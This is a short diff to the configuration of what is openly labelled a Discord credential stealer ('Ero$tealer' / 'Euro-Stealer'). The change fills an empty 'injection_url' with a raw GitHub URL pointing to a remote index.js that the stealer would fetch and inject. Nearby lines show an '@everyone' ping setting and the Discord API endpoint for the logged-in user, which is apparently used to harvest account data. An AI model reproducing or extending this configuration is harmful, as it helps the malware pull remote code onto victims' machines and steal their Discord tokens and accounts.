@@ -58,7 +58,7 @@ const config = {
   'ping_val': "@everyone",
   'embed_name': "Ero$tealer",
   'embed_icon': "https://imgur.com/a/euro-stealer-TWoKVhE".replace(/ /g, "%20"),
-  'injection_url': '',
+  'injection_url': 'https://raw.githubusercontent.com/Shadow132245/Euro-Stealer/refs/heads/main/index.js',
   'api': 'https://discord.com/api/v9/users/@me',
   'nitro': {
     'boost': {
